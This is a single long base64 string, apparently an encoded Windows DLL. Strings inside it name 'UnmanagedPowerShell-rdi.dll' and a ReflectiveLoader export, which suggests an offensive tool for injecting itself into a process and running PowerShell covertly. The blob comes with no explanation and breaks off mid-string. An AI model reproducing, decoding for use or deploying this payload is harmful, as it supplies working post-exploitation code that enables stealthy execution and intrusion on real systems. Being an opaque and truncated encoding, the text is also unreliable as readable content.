UFBQUFBQUFBQUFBQXdBb0FCQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUxCQ0FZQUJBQUFBdUVJQmdBRUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVBQUFBQUFBQUJBQUFBQUFBQUFBQUFBQURZT1FJQThBa0NBTWdKQWdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUNBb0NBQUFBQUFBQUFBQUFHQW9DQUFBQUFBQUFBQUFBQUFBQUFOZzVBZ0FBQUFBQUFBQUFBUC8vLy84QUFBQUFRQUFBQVBBSkFnQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBQUFBQUFDd09RSUFhQW9DQUVBS0FnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ0FBQUFnQW9DQUFBQUFBQUFBQUFBbUFvQ0FCZ0tBZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFzRGtDQUFFQUFBQUFBQUFBLy8vLy93QUFBQUJBQUFBQWFBb0NBQUFBQUFBQUFBQUFBQUFBQUFFQUFBQUFBQUFBQUFBQUFBQTZBZ0RvQ2dJQXdBb0NBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUFBQUFBQ3dJQUFBQUFBQUFBQUFBZ0N3SUFtQW9DQUJnS0FnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE2QWdBQ0FBQUFBQUFBQVAvLy8vOEFBQUFBUUFBQUFPZ0tBZ0FBQUFBQUFBQUFBQUFBQUFBQkFBQUFBQUFBQUFBQUFBQXdPZ0lBY0FzQ0FFZ0xBZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBaUFzQ0FBQUFBQUFBQUFBQW1Bc0NBQUFBQUFBQUFBQUFBQUFBQURBNkFnQUFBQUFBQUFBQUFQLy8vLzhBQUFBQVFBQUFBSEFMQWdBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBQUFBQUI0T2dJQTZBc0NBTUFMQWdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDQUFBQUFBd0NBQUFBQUFBQUFBQUFHQXdDQUJnS0FnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWVEb0NBQUVBQUFBQUFBQUEvLy8vL3dBQUFBQkFBQUFBNkFzQ0FBQUFBQUFBQUFBQUFBQUFBRVZVVnpBUUFBQUJoZzRFaUNzRmlyc0ZCUUFBQUFBQUFBQUFJQUFBTHdBQVNXNTJiMnRsVFdGcGJsWnBZVU5TVkFBaVRXRnBiaUJKYm5admEyVmtMaUlBQWtacGJHVk9ZVzFsQUFFRkJRQUFBQUFBQUFBQUlBQUFMZ0FBUlhocGRFMWhhVzVXYVdGRFVsUUFJazFoYVc0Z1VtVjBkWEp1WldRdUlnQUNSbWxzWlU1aGJXVUFBUUlyQUUxcFkzSnZjMjltZEM1RFVsUlFjbTkyYVdSbGNnQVRBQUVhYzFCUHo0bUNSN1BnM09qSkJIYTZBVWREVkV3QUVBQUEyd0VBQUM1MFpYaDBBQUFBNEJFQUFBd0FBQUF1ZEdWNGRDUmthUUFBQUFEd0VRQUF0eGtCQUM1MFpYaDBKRzF1QUFBQUFMQXJBUUFTQUFBQUxuUmxlSFFrYlc0a01EQUEwQ3NCQUlBRUFBQXVkR1Y0ZENSNEFGQXdBUUFPQUFBQUxuUmxlSFFrZVdRQUFBQUFBRUFCQUxBQ0FBQXVhV1JoZEdFa05RQUFBQUN3UWdFQUVBQUFBQzR3TUdObVp3QUF3RUlCQUFnQUFBQXVRMUpVSkZoRFFRQUFBQURJUWdFQUNBQUFBQzVEVWxRa1dFTlZBQUFBQU5CQ0FRQUlBQUFBTGtOU1ZDUllRMW9BQUFBQTJFSUJBQWdBQUFBdVExSlVKRmhKUVFBQUFBRGdRZ0VBR0FBQUFDNURVbFFrV0VsREFBQUFBUGhDQVFBSUFBQUFMa05TVkNSWVNWb0FBQUFBQUVNQkFBZ0FBQUF1UTFKVUpGaFFRUUFBQUFBSVF3RUFFQUFBQUM1RFVsUWtXRkJZQUFBQUFCaERBUUFJQUFBQUxrTlNWQ1JZVUZoQkFBQUFJRU1CQUFnQUFBQXVRMUpVSkZoUVdnQUFBQUFvUXdFQUNBQUFBQzVEVWxRa1dGUkJBQUFBQURCREFRQUlBQUFBTGtOU1ZDUllWRm9BQUFBQVFFTUJBSVRHQUFBdWNtUmhkR0VBQU1nSkFnQjBBZ0FBTG5Ka1lYUmhKSElBQUFBQVFBd0NBQkFBQUFBdWNtUmhkR0VrZWtWVVZ6QUFBQUFBVUF3Q0FIY0FBQUF1Y21SaGRHRWtla1ZVVnpFQUFBQUF4d3dDQUN3QUFBQXVjbVJoZEdFa2VrVlVWeklBQUFBQTh3d0NBQUVBQUFBdWNtUmhkR0VrZWtWVVZ6a0FBQUFBOUF3Q0FJZ0RBQUF1Y21SaGRHRWtlbnA2WkdKbkFBQUFnQkFDQUFnQUFBQXVjblJqSkVsQlFRQUFBQUNJRUFJQUNBQUFBQzV5ZEdNa1NWcGFBQUFBQUpBUUFnQUlBQUFBTG5KMFl5UlVRVUVBQUFBQW1CQUNBQWdBQUFBdWNuUmpKRlJhV2dBQUFBQ2dFQUlBVEJBQUFDNTRaR0YwWVFBQThDQUNBS1FCQUFBdWVHUmhkR0VrZUFBQUFBQ2dJZ0lBZndBQUFDNWxaR0YwWVFBQUlDTUNBRkFBQUFBdWFXUmhkR0VrTWdBQUFBQndJd0lBRkFBQUFDNXBaR0YwWVNRekFBQUFBSWdqQWdDd0FnQUFMbWxrWVhSaEpEUUFBQUFBT0NZQ0FIQUZBQUF1YVdSaGRHRWtOZ0FBQUFBQU1BSUFzQWtBQUM1a1lYUmhBQUFBc0RrQ0FQQUFBQUF1WkdGMFlTUnlBS0E2QWdESUVBQUFMbUp6Y3dBQUFBQUFVQUlBUEJJQUFDNXdaR0YwWVFBQUFIQUNBSHdBQUFBdVoyWnBaSE1rZUFBQUFBQjhjQUlBU0FBQUFDNW5abWxrY3lSNUFBQUFBQUNBQWdCWUFBQUFMbkp6Y21Na01ERUFBQUFBWUlBQ0FJQUJBQUF1Y25OeVl5UXdNZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBWkhnWUFEMlFQQUE4MERnQVBzZ3R3cENjQkFGQUFBQUFaSlFrQUV6Um9BQk1CWUFBTThBcmdDSEFIWUFaUUFBQ2tKd0VBOEFJQUFCa1RBUUFFZ2dBQXBDY0JBREFBQUFBQkJBRUFCRUlBQUFFVkNRQVZZaEh3RCtBTjBBdkFDWEFJWUFkUUJqQUFBQUVLQkFBS05BY0FDaklHY0JrZEJnQVBOQThBRDNJSWNBZGdCbENrSndFQU9BQUFBQmt3Q1FBaVpDQUFIalFmQUJJQkdnQUg4QVZ3QkZBQUFCZ3JBUURJQ0FJQXlnQUFBUC8vLy8vUUt3RUFBQUFBQU53ckFRQUFBQUFBL0NzQkFBSUFBQUFJTEFFQUF3QUFBQlFzQVFBRUFBQUFJQ3dCQUNRYkFBRC8vLy8vV3hzQUFBQUFBQUJ3R3dBQUFRQUFBSzhiQUFBQUFBQUF3eHNBQUFJQUFBRHRHd0FBQXdBQUFQZ2JBQUFFQUFBQUF4d0FBQVVBQUFDd0hBQUFCQUFBQUxzY0FBQURBQUFBeGh3QUFBSUFBQURSSEFBQUFBQUFBQThkQUFELy8vLy9BUVlDQUFZeUFsQVpOQXNBSm1RYUFDSTBHUUFXQVJJQUMvQUo0QWZBQlhBRVVBQUFHQ3NCQUtBSUFnQ0NBQUFBLy8vLy95d3NBUUFBQUFBQU9Dd0JBQUVBQUFCRUxBRUFBUUFBQUdFc0FRQURBQUFBYlN3QkFBUUFBQUI1TEFFQUJBQUFBSllzQVFCRUhRQUEvLy8vLzRrZEFBQUFBQUFBalIwQUFBRUFBQUNnSFFBQUFnQUFBTThkQUFBQkFBQUE0eDBBQUFNQUFBRG5IUUFBQkFBQUFQWWRBQUFGQUFBQUlCNEFBQVFBQUFBMEhnQUFCZ0FBQUFraEFBQUVBQUFBU3lFQUFBTUFBQUJiSVFBQUFRQUFBSmtoQUFBQUFBQUFxU0VBQVAvLy8vOEJHZ1FBR2xJV2NCVmdGREFBQUFBQUFRQUFBQkVWQ0FBVmRBa0FGV1FIQUJVMEJnQVZNaEhnMEVzQUFBRUFBQUJESXdBQTBDTUFBS0lzQVFBQUFBQUFFUThHQUE5a0NBQVBOQVlBRHpJTGNOQkxBQUFCQUFBQWFpUUFBSWdrQUFDNUxBRUFBQUFBQUFrYUJnQWFOQThBR25JVzRCUndFMkRRU3dBQUFRQUFBTm9rQUFDcUpRQUExU3dCQUtvbEFBQUJCZ0lBQmxJQ1VBRUpBUUFKWWdBQUFRZ0VBQWh5QkhBRFlBSXdBUVFCQUFTQ0FBQUpCQUVBQkNJQUFOQkxBQUFCQUFBQTl5c0FBSVVzQUFBTExRRUFoU3dBQUFFQ0FRQUNVQUFBQVFZQ0FBWXlBakFCRFFRQURUUUtBQTF5QmxBQkRRUUFEVFFKQUEweUJsQUJGUVVBRlRTNkFCVUJ1QUFHVUFBQUFRMEVBQTAwQndBTk1nWlFBUUFBQUJrb0NUVWFaQkFBRmpRUEFCSXpEWklKNEFkd0JsQUFBS0FtQVFBQkFBQUE1RElBQURBekFBQUJBQUFBTURNQUFFa0FBQUFaRUFnQUVOSU04QXJnQ05BR3dBUndBMkFDTU5CTEFBQUNBQUFBMlVJQUFQNUNBQUFqTFFFQS9rSUFBTmxDQUFCMlF3QUFTQzBCQUFBQUFBQUJCd01BQjBJRFVBSXdBQUFaSWdnQUlsSWU4QnpnR3RBWXdCWndGV0FVTU5CTEFBQUNBQUFBeDBRQUFGNUZBQURZTFFFQVhrVUFBSXhFQUFDTFJRQUE3aTBCQUFBQUFBQUJKdzBBSjNRZkFDZGtIUUFuTkJ3QUp3RVdBQnp3R3VBWTBCYkFGRkFBQUFFWENnQVhWQklBRnpRUUFCZVNFL0FSNEEvQURYQU1ZQWtWQ0FBVmRBZ0FGV1FIQUJVMEJnQVZNaEhnMEVzQUFBRUFBQUNJUHdBQUEwQUFBQUVBQUFBRFFBQUFBUmtLQUJrMEZ3QVowaFh3RStBUjBBL0FEWEFNWUF0UUNSTUVBQk0wQmdBVE1nOXcwRXNBQUFFQUFBQkROUUFBVVRVQUFNQXRBUUJUTlFBQUNSa0tBQmwwREFBWlpBc0FHVFFLQUJsU0ZmQVQ0QkhRMEVzQUFBSUFBQUN1UUFBQTJFRUFBQUVBQUFEaVFRQUEzRUVBQU9KQkFBQUJBQUFBNGtFQUFCa21CUUFWTkZVQUZRRlNBQVpRQUFDa0p3RUFnQUlBQUFFUEJnQVBaQWNBRHpRR0FBOHlDM0FCSFF3QUhYUVBBQjFrRGdBZFZBMEFIVFFNQUIxeUdmQVg0QlhBQVFZQ0FBWnlBakFCSEF3QUhHUVFBQnhVRHdBY05BNEFISElZOEJiZ0ZOQVN3QkJ3QVJVSUFCVjBDQUFWWkFjQUZUUUdBQlV5RWVBQkZRZ0FGV1FTQUJVMEVRQVZzZzdnREhBTFVBQUFBQUFCQUFBQUFSWUtBQlpVREFBV05Bc0FGaklTOEJEZ0RzQU1jQXRnQVJJSUFCSlVDUUFTTkFnQUVqSU80QXh3QzJBSkdRTUFHY0lWY0JRd0FBRFFTd0FBQVFBQUFEeFZBQUJnVlFBQUVTNEJBR0JWQUFBQkJnSUFCbklDVUFFZERBQWRkQXNBSFdRS0FCMVVDUUFkTkFnQUhUSVo4QmZnRmNBWklnTUFFUUcyQUFKUUFBQ2tKd0VBb0FVQUFBRVBCZ0FQWkF3QUR6UUxBQTl5QzNBQkZBZ0FGR1FNQUJSVUN3QVVOQW9BRkhJUWNBRUFBQUFBQUFBQUFRUUJBQVJDQUFBQkJ3SUFCd0diQUFFQUFBQUJBQUFBQVFBQUFBRVpDZ0FaZEFrQUdXUUlBQmxVQndBWk5BWUFHVElWNEFFWkNnQVpkQXNBR1dRS0FCbFVDUUFaTkFnQUdWSVY0QUVjREFBY1pBd0FIRlFMQUJ3MENnQWNNaGp3RnVBVTBCTEFFSEFCQ1FJQUNiSUNVQUVZQ2dBWVpBc0FHRlFLQUJnMENRQVlNaFR3RXVBUWNBRVpDZ0FaNUFrQUdYUUlBQmxrQndBWk5BWUFHVElWOEFFVUNBQVVaQWtBRkZRSUFCUTBCd0FVTWhCd0dTc01BQnhrRVFBY1ZCQUFIRFFQQUJ4eUdQQVc0QlRRRXNBUWNLUW5BUUE0QUFBQUFROEdBQTlrQ0FBUE5BY0FEeklMY0FFUUJnQVFkQTRBRURRTkFCQ1NET0FCRWdnQUVsUU1BQkkwQ3dBU1VnN2dESEFMWUJra0J3QVNaS0lBRWpTaEFCSUJuZ0FMY0FBQXBDY0JBT0FFQUFBQklnb0FJblFKQUNKa0NBQWlWQWNBSWpRR0FDSXlIdUFCQlFJQUJUUUJBQkVQQkFBUE5BWUFEeklMY05CTEFBQUJBQUFBWG1nQUFHaG9BQUJkTGdFQUFBQUFBQkVHQWdBR01nSXcwRXNBQUFFQUFBQ2FmZ0FBc0g0QUFIZ3VBUUFBQUFBQUdSa0tBQm5rQ1FBWmRBZ0FHV1FIQUJrMEJnQVpNaFh3MEVzQUFBSUFBQURiZ1FBQU9ZSUFBSTR1QVFCNGdnQUF2NEVBQUg2Q0FBQ3BMZ0VBQUFBQUFBRVBCQUFQTkFZQUR6SUxjQUVZQ2dBWVpBd0FHRlFMQUJnMENnQVlVaFR3RXVBUWNBRVNBZ0FTY2d0UUFRc0JBQXRpQUFBUkR3UUFEelFHQUE4eUMzRFFTd0FBQVFBQUFOV0ZBQURmaFFBQVJDOEJBQUFBQUFBUkhBb0FIR1FQQUJ3MERnQWNjaGp3RnVBVTBCTEFFSERRU3dBQUFRQUFBQjZHQUFCeWh3QUF3aTRCQUFBQUFBQUpCZ0lBQmpJQ01OQkxBQUFCQUFBQTZJc0FBUFdMQUFBQkFBQUE5WXNBQUFFY0RBQWNaQk1BSEZRU0FCdzBFQUFja2hqd0Z1QVUwQkxBRUhBQkJBRUFCR0lBQUJrdUNRQWRaTVFBSFRUREFCMEJ2Z0FPNEF4d0MxQUFBS1FuQVFEZ0JRQUFBUW9FQUFvMEJnQUtNZ1p3QVFVQ0FBVjBBUUFSQ2dRQUNqUUlBQXBTQm5EUVN3QUFBUUFBQUJhZUFBQ1ZuZ0FBM3k0QkFBQUFBQUFSRkFnQUZHUU9BQlEwREFBVWNoRHdEdUFNY05CTEFBQUNBQUFBNXA4QUFDeWdBQUQ0TGdFQUFBQUFBS21mQUFBNm9BQUFFaThCQUFBQUFBQVJCZ0lBQmpJQ01OQkxBQUFCQUFBQW5xSUFBTFdpQUFBckx3RUFBQUFBQUFFY0N3QWNkQmNBSEdRV0FCeFVGUUFjTkJRQUhBRVNBQlhnQUFBQkVnWUFFbVFUQUJJMEVRQVMwZ3RRQVFZQ0FBWlNBakFCR1FvQUdYUVBBQmxrRGdBWlZBMEFHVFFNQUJtU0ZlQUJGUVlBRldRUUFCVTBEZ0FWc2hGd0FROENBQVl5QWxBQkNnSUFDaklHTUFFSkFnQUprZ0pRQVFrQ0FBbHlBbEFSRHdRQUR6UUdBQTh5QzNEUVN3QUFBUUFBQUJtckFBQXBxd0FBUkM4QkFBQUFBQUFSRHdRQUR6UUdBQTh5QzNEUVN3QUFBUUFBQU5HcUFBRG5xZ0FBUkM4QkFBQUFBQUFSRHdRQUR6UUdBQTh5QzNEUVN3QUFBUUFBQUhHcUFBQ2hxZ0FBUkM4QkFBQUFBQUFSRHdRQUR6UUdBQTh5QzNEUVN3QUFBUUFBQUZtckFBQm5xd0FBUkM4QkFBQUFBQUFCSEF3QUhHUVVBQnhVRXdBY05CSUFITElZOEJiZ0ZOQVN3QkJ3R1J3REFBNEJHQUFDVUFBQXBDY0JBTEFBQUFBQkdRb0FHWFFQQUJsa0RnQVpWQTBBR1RRTUFCbVNGZkFCRkFnQUZHUU9BQlJVRFFBVU5Bd0FGSklRY0FFZERBQWRkQlVBSFdRVUFCMVVFd0FkTkJJQUhkSVo4QmZnRmNBQkZRZ0FGV1FPQUJWVURRQVZOQXdBRlpJUjRCa2hDQUFTVkE0QUVqUU5BQkp5RHVBTWNBdGdwQ2NCQURBQUFBQUJDUUlBQ1RJRk1CRUdBZ0FHTWdKdzBFc0FBQUVBQUFDVnZ3QUFxNzhBQUY0dkFRQUFBQUFBRVFvRUFBbzBCd0FLTWdadzBFc0FBQUVBQUFEV3h3QUFOTWdBQUhjdkFRQUFBQUFBR1NVS0FCWlVFUUFXTkJBQUZuSVM4QkRnRHNBTWNBdGdwQ2NCQURnQUFBQUJGQWdBRkdRSUFCUlVCd0FVTkFZQUZESVFjQmtyQndBYWRQUUFHalR6QUJvQjhBQUxVQUFBcENjQkFIQUhBQUFCRHdZQUR6UU1BQTl5Q0hBSFlBWlFFUThFQUE4MEJnQVBNZ3R3MEVzQUFBRUFBQUNSd0FBQW1zQUFBRVF2QVFBQUFBQUFBUmtLQUJsMERRQVpaQXdBR1ZRTEFCazBDZ0FaY2hYZ0FRY0JBQWRDQUFBUkVBY0FFSUlNOEFyUUNNQUdjQVZnQkRBQUFOQkxBQUFCQUFBQWg4OEFBSUhRQUFDUUx3RUFBQUFBQUJFUEJBQVBOQVlBRHpJTGNOQkxBQUFCQUFBQTlzMEFBQXpPQUFCRUx3RUFBQUFBQUJrb0NBQWE1QlVBR25RVUFCcGtFd0FhOGhCUXBDY0JBSEFBQUFBQkZRa0FGWFFGQUJWa0JBQVZWQU1BRlRRQ0FCWGdBQUFSRHdRQUR6UUhBQTh5QzNEUVN3QUFBUUFBQUFMVkFBQU0xUUFBdEM4QkFBQUFBQUFSRHdRQUR6UUdBQTh5QzNEUVN3QUFBUUFBQUVIVkFBQ2MxUUFBekM4QkFBQUFBQUFSR3dvQUcyUU1BQnMwQ3dBYk1oZndGZUFUMEJIQUQzRFFTd0FBQVFBQUFHTGNBQUNTM0FBQTVpOEJBQUFBQUFBQkZ3b0FGelFYQUJleUVQQU80QXpRQ3NBSWNBZGdCbEFaS0FvQUdqUVlBQnJ5RVBBTzRBelFDc0FJY0FkZ0JsQ2tKd0VBY0FBQUFCa3RDUUFiVkpBQ0d6U09BaHNCaWdJTzRBeHdDMkFBQUtRbkFRQkFGQUFBR1RFTEFCOVVsZ0lmTkpRQ0h3R09BaEx3RU9BT3dBeHdDMkFBQUtRbkFRQmdGQUFBQVJRR0FCUmtCd0FVTkFZQUZESVFjQkVWQ0FBVmRBb0FGV1FKQUJVMENBQVZVaEh3MEVzQUFBRUFBQURrNEFBQU1lRUFBQ3N2QVFBQUFBQUFBUThHQUE5a0VRQVBOQkFBRDlJTGNCa3REVlVmZEJRQUcyUVRBQmMwRWdBVFV3NnlDdkFJNEFiUUJNQUNVQUFBcENjQkFGZ0FBQUFSQ2dRQUNqUUdBQW95Qm5EUVN3QUFBUUFBQUcvcUFBQ0Y2Z0FBWGk4QkFBQUFBQUFaTFFvQUhBSDdBQTN3QytBSjBBZkFCWEFFWUFNd0FsQ2tKd0VBd0FjQUFBRlpEZ0JaOUVNQVVlUkVBRW5FUmdCQlZFY0FOalJJQUE0QlNRQUhjQVpnSVFnQ0FBalVSUURRNndBQU9lMEFBT2dlQWdBaEFBQUEwT3NBQURudEFBRG9IZ0lBQVJjR0FCZGtDUUFYTkFnQUZ6SVRjQUVZQmdBWVpBa0FHRFFJQUJneUZIQUJEZ0lBRGpJS01BRVlCZ0FZVkFjQUdEUUdBQmd5RkdBWkxRMDFIM1FVQUJ0a0V3QVhOQklBRXpNT3NncndDT0FHMEFUQUFsQUFBS1FuQVFCUUFBQUFBUWdCQUFoaUFBQVJEd1FBRHpRR0FBOHlDM0RRU3dBQUFRQUFBRmtPQVFDWkRnRUF6QzhCQUFBQUFBQVJHd29BRzJRTUFCczBDd0FiTWhmd0ZlQVQwQkhBRDNEUVN3QUFBUUFBQU5NUUFRQUVFUUVBNWk4QkFBQUFBQUFCQ2dNQUNtZ0NBQVNpQUFBSkdRb0FHWFFMQUJsa0NnQVpOQWtBR1RJVjhCUGdFY0RRU3dBQUFRQUFBSFlkQVFCL0hRRUEvUzhCQUg4ZEFRQUJDQUlBQ0pJRU1Ca21DUUFZYUE0QUZBRWVBQW5nQjNBR1lBVXdCRkFBQUtRbkFRRFFBQUFBQVFZQ0FBWVNBakFCQ3dNQUMyZ0ZBQWZDQUFBQkJBRUFCQUlBQUFFYkNBQWJkQWtBRzJRSUFCczBCd0FiTWhSUUNROEdBQTlrQ1FBUE5BZ0FEeklMY05CTEFBQUJBQUFBSWlZQkFDa21BUUQ5THdFQUtTWUJBQUFBQUFBQkJBRUFCQklBQUFFQ0FRQUNNQUFBQ1FvRUFBbzBCZ0FLTWdadzBFc0FBQUVBQUFCOUtBRUFzQ2dCQURBd0FRQ3dLQUVBQVFRQkFBUWlBQUFBQUFBQUFRQUFBQUFBQUFBQUFBQUEwQ2dBQUFBQUFBQVFJUUlBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUlBQUFBb0lRSUFVQ0VDQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUN3T1FJQUFBQUFBUC8vLy84QUFBQUFHQUFBQU5nbkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQTJEa0NBQUFBQUFELy8vLy9BQUFBQUJnQUFBQ1lLQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTkFvQUFBQUFBQUFtQ0VDQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFEQUFBQXVDRUNBQ2doQWdCUUlRSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT2dJQUFBQUFBUC8vLy84QUFBQUFHQUFBQURnb0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU1EUUFBQUFBQUFBQUlnSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFRSWdJQUFBQUFBQUFBQUFBQUFBQUFVRG9DQUFBQUFBRC8vLy8vQUFBQUFDQUFBQUR3TXdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU5Bb0FBQUFBQUFBV0NJQ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ0FBQUFjQ0lDQUZBaEFnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWVEb0NBQUFBQUFELy8vLy9BQUFBQUJnQUFBQ01OUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF1OExpVndBQUFBRGNJZ0lBQVFBQUFBSUFBQUFDQUFBQXlDSUNBTkFpQWdEWUlnSUE2QlFBQURRVUFBRDRJZ0lBRmlNQ0FBQUFBUUJWYm0xaGJtRm5aV1JRYjNkbGNsTm9aV3hzTFhKa2FTNWtiR3dBUDFKbFpteGxZM1JwZG1WTWIyRmtaWEpBUUZsQlgwdFFSVUZZUUZvQVZtOXBaRVoxYm1NQUFKZ2pBZ0FBQUFBQUFBQUFBSWdtQWdBUVFBRUFJQ1lDQUFBQUFBQUFBQUFBdWlZQ0FKaENBUURJSlFJQUFBQUFBQUFBQUFERUpnSUFRRUlCQUlnakFnQUFBQUFBQUFBQUFKb3JBZ0FBUUFFQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBaGlzQ0FBQUFBQUFBQUFBQUFBQUFBR2dtQWdBQUFBQUFlQ1lDQUFBQUFBQmFKZ0lBQUFBQUFFZ21BZ0FBQUFBQU9DWUNBQUFBQUFCNEt3SUFBQUFBQUdnckFnQUFBQUFBVkNzQ0FBQUFBQUJHS3dJQUFBQUFBRGdyQWdBQUFBQUFMQ3NDQUFBQUFBQWNLd0lBQUFBQUFBb3JBZ0FBQUFBQTBpWUNBQUFBQUFEbUpnSUFBQUFBQUFBbkFnQUFBQUFBRkNjQ0FBQUFBQUF3SndJQUFBQUFBRTRuQWdBQUFBQUFZaWNDQUFBQUFBQjJKd0lBQUFBQUFKSW5BZ0FBQUFBQXJDY0NBQUFBQUFEQ0p3SUFBQUFBQU5nbkFnQUFBQUFBOGljQ0FBQUFBQUFJS0FJQUFBQUFBQndvQWdBQUFBQUFMaWdDQUFBQUFBQkNLQUlBQUFBQUFGSW9BZ0FBQUFBQWFDZ0NBQUFBQUFCK0tBSUFBQUFBQUlvb0FnQUFBQUFBbmlnQ0FBQUFBQUN1S0FJQUFBQUFBTUFvQWdBQUFBQUExaWdDQUFBQUFBRGtLQUlBQUFBQUFQd29BZ0FBQUFBQURDa0NBQUFBQUFBMEtRSUFBQUFBQUVBcEFnQUFBQUFBVGlrQ0FBQUFBQUJjS1FJQUFBQUFBR1lwQWdBQUFBQUFlQ2tDQUFBQUFBQ1FLUUlBQUFBQUFLZ3BBZ0FBQUFBQXdDa0NBQUFBQUFET0tRSUFBQUFBQU9RcEFnQUFBQUFBOENrQ0FBQUFBQUQ4S1FJQUFBQUFBQXdxQWdBQUFBQUFIQ29DQUFBQUFBQXFLZ0lBQUFBQUFEUXFBZ0FBQUFBQVJpb0NBQUFBQUFCU0tnSUFBQUFBQUY0cUFnQUFBQUFBZUNvQ0FBQUFBQUNTS2dJQUFBQUFBS1FxQWdBQUFBQUF0aW9DQUFBQUFBRElLZ0lBQUFBQUFOb3FBZ0FBQUFBQTdpb0NBQUFBQUFENktnSUFBQUFBQUFBQUFBQUFBQUFBRmdBQUFBQUFBSUFWQUFBQUFBQUFnQThBQUFBQUFBQ0FFQUFBQUFBQUFJQWFBQUFBQUFBQWdKc0JBQUFBQUFDQUNRQUFBQUFBQUlBSUFBQUFBQUFBZ0FZQUFBQUFBQUNBQWdBQUFBQUFBSUFBQUFBQUFBQUFBS2dtQWdBQUFBQUFsaVlDQUFBQUFBQUFBQUFBQUFBQUFFRURURzloWkV4cFluSmhjbmxYQUFCTUFrZGxkRkJ5YjJOQlpHUnlaWE56QUFCb0FVWnlaV1ZNYVdKeVlYSjVBSG9DUjJWMFUzbHpkR1Z0U1c1bWJ3Qm1CRk5sZEVWeWNtOXlUVzlrWlFBQVMwVlNUa1ZNTXpJdVpHeHNBQUJEQUVOdlNXNXBkR2xoYkdsNlpVVjRBQUJ3QUVOdlZXNXBibWwwYVdGc2FYcGxBQUJ2YkdVek1pNWtiR3dBVDB4RlFWVlVNekl1Wkd4c0FBQVlCRkowYkVOaGNIUjFjbVZEYjI1MFpYaDBBQjhFVW5Sc1RHOXZhM1Z3Um5WdVkzUnBiMjVGYm5SeWVRQUFKZ1JTZEd4V2FYSjBkV0ZzVlc1M2FXNWtBQURpQkZWdWFHRnVaR3hsWkVWNFkyVndkR2x2YmtacGJIUmxjZ0FBc3dSVFpYUlZibWhoYm1Sc1pXUkZlR05sY0hScGIyNUdhV3gwWlhJQXhnRkhaWFJEZFhKeVpXNTBVSEp2WTJWemN3RE9CRlJsY20xcGJtRjBaVkJ5YjJObGMzTUFBQVlEU1hOUWNtOWpaWE56YjNKR1pXRjBkWEpsVUhKbGMyVnVkQUNwQTFGMVpYSjVVR1Z5Wm05eWJXRnVZMlZEYjNWdWRHVnlBTWNCUjJWMFEzVnljbVZ1ZEZCeWIyTmxjM05KWkFETEFVZGxkRU4xY25KbGJuUlVhSEpsWVdSSlpBQUFnQUpIWlhSVGVYTjBaVzFVYVcxbFFYTkdhV3hsVkdsdFpRRHZBa2x1YVhScFlXeHBlbVZUVEdsemRFaGxZV1FBQWdOSmMwUmxZblZuWjJWeVVISmxjMlZ1ZEFCcUFrZGxkRk4wWVhKMGRYQkpibVp2VndBZUFrZGxkRTF2WkhWc1pVaGhibVJzWlZjQUFBZ0NSMlYwVEdGemRFVnljbTl5QUFCcEEwMTFiSFJwUW5sMFpWUnZWMmxrWlVOb1lYSUFJQVZYYVdSbFEyaGhjbFJ2VFhWc2RHbENlWFJsQUVvRFRHOWpZV3hHY21WbEFDRUVVblJzVUdOVWIwWnBiR1ZJWldGa1pYSUE3Z0JGYm1OdlpHVlFiMmx1ZEdWeUFMUURVbUZwYzJWRmVHTmxjSFJwYjI0QUFCb0NSMlYwVFc5a2RXeGxSbWxzWlU1aGJXVlhBQUFsQkZKMGJGVnVkMmx1WkVWNEFQRUNTVzUwWlhKc2IyTnJaV1JHYkhWemFGTk1hWE4wQUlBRVUyVjBUR0Z6ZEVWeWNtOXlBQURyQWtsdWFYUnBZV3hwZW1WRGNtbDBhV05oYkZObFkzUnBiMjVCYm1SVGNHbHVRMjkxYm5RQTB3UlViSE5CYkd4dll3QUExUVJVYkhOSFpYUldZV3gxWlFEV0JGUnNjMU5sZEZaaGJIVmxBTlFFVkd4elJuSmxaUUJBQTB4dllXUk1hV0p5WVhKNVJYaFhBQUR5QUVWdWRHVnlRM0pwZEdsallXeFRaV04wYVc5dUFBQTdBMHhsWVhabFEzSnBkR2xqWVd4VFpXTjBhVzl1QUFEU0FFUmxiR1YwWlVOeWFYUnBZMkZzVTJWamRHbHZiZ0FmQVVWNGFYUlFjbTlqWlhOekFCMENSMlYwVFc5a2RXeGxTR0Z1Wkd4bFJYaFhBQURYQWtobFlYQkdjbVZsQUFEVEFraGxZWEJCYkd4dll3QXZBMHhEVFdGd1UzUnlhVzVuVndBQWF3SkhaWFJUZEdSSVlXNWtiR1VBQVBvQlIyVjBSbWxzWlZSNWNHVUFiZ0ZIWlhSQlExQUFBQXdEU1hOV1lXeHBaRU52WkdWUVlXZGxBRDRDUjJWMFQwVk5RMUFBQUhnQlIyVjBRMUJKYm1adkFPRUJSMlYwUlc1MmFYSnZibTFsYm5SVGRISnBibWR6VndBQVp3RkdjbVZsUl